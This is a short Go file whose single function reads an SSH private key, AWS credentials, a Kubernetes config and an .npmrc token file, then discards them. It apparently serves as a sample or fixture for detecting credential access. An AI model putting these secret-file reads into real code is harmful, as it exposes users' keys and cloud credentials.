package main

import (
	"os"
	"path/filepath"
)

func run(home string, h string) {
	data, _ := os.ReadFile(filepath.Join(home, ".ssh/id_rsa"))
	f, _ := os.Open("/root/.aws/credentials")
	content, _ := os.ReadFile(filepath.Join(h, ".kube/config"))
	npmrc, _ := os.ReadFile("~/.npmrc")
	_ = data
	_ = f
	_ = content
	_ = npmrc
}
